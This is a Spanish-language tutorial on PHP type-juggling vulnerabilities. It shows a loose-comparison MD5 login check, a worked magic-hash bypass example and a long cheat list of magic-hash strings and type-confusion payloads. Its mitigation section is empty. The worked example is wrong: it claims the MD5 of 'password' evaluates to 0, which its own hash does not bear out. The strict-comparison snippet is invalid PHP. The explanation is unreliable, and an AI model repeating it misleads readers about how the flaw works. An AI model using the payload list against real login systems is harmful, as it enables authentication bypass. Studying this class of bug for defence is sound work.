### ¿Qué es Type Juggling?
En PHP, hay distintos tipos de variables, tales como: `strings`, `integers`, `floats`, `booleans`, `arrays`, `objects`, `resources` y `NULL`. Cada tipo significa una clase distinta de información. PHP permite el *Type Juggling*, es decir, el tipo de una variable puede cambiar si se necesita. Por ejemplo, puede ser que una variable inicializada como `string` de valor `10` cambie a `integer` si es necesario u oportuno.
##### Tipos de comparadores
En lo que se refiere a comparar variables, en PHP hay dos tipos de comparadores, *Loose* (`==`) y *Strict* (`===`). El comparador estricto comprueba si el valor y el tipo coinciden, por ejemplo
```PHP
$valor = 10
$valor === int // Aquí el output sería TRUE
```
En cambio, el comparador "laxo" utilizará type juggling para comparar únicamente los valores, y no los tipos.
```PHP
$valor1 = 10
$valor2 = "10"
$valor1 == $valor2 // Esto sería TRUE, a pesar de valor1 ser un entero y valor2 un string.
```
### ¿Qué es TJA?
Cuando un atacante puede manipular el valor de una variable que se está comparando con loose, se puede manipular la aplicación para que de resultados `TRUE` o `FALSE` de forma inesperada, provocando errores de autorización y autenticación graves.
```PHP
<?php
function login($username, $password, $users) {
    if (isset($users[$username])) {
        return md5($password) == $users[$username];
    }
    return false;
}
```
En este caso, si el atacante tiene control sobre el campo de `$password` y `$username`, este podría cargar payloads maliciosos en notación científica, que PHP interpreta como 0, y que la comparación sea TRUE ya que está comparando `0==0`, que en cualquier caso, aún uno de los dos siendo un string, será verdadero, bypasseando efectivamente el panel de login.
```PHP
<?php
// Base de datos simulada
$users = [
    'admin' => '5f4dcc3b5aa765d61d8327deb882cf99' // md5('password')
];

// Ataque exitoso - el atacante controla estos valores
$username = 'admin';
$password = '240610708'; // Magic hash

// El ataque funciona
$result = login($username, $password, $users);
// Devuelve TRUE porque:
// md5('240610708') = "0e462097431906509019562988736854" → 0
// md5('password')  = "5f4dcc3b5aa765d61d8327deb882cf99" → 0
// 0 == 0 → TRUE
?>
```
### Mitigación y prevención
### Cheats
```
0
00
000000
0e123456
0e000000000000000000000000000000
0e000000000000000000000000000000000000000000000000000000000000
0x0
0x123
0xdeadbeef
0e1+
0.0
0||1
0+0
240610708
505144726
48291204
315655854
809793630
71437579
115528287
10000676
10000188
10000240
10000181
13181623570
62241955574
20583002034
QNKCDZO
aabg7XSs
10932435112
0e462097431906509019562988736854
0e830400451993494058024219903391
0e087386482136013740957780965295
0e07766915004133176347055865026311692244
s878926199a
s155964671a
s214587387a
s1091221200a
s1665632922a
s1502113478a
s1975215894a
true
false
null
TRUE
FALSE
NULL
on
off
yes
no
"0"
"0e1"
"0x1"
"0b1"
"000000"
"0xdeadbeef"
"0e000000000000000000000000000000"
"0x0"
"0.0"
"0 "
" 0"
0||1
1||0
0&&1
1&&0
0==1
1==0
0!=1
1!=0
0x1a2b3c
0xabcdef
0o755
0b101010
0x000000
0xffffffff
0e1abcdef
0x1.2p3
```
### Fuentes
[Knowledge base](https://knowledge-base.secureflag.com/vulnerabilities/inadequate_input_validation/type_juggling_vulnerability.html)
[PATT](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling)
[SecOps](https://secops.group/php-type-juggling-simplified/)
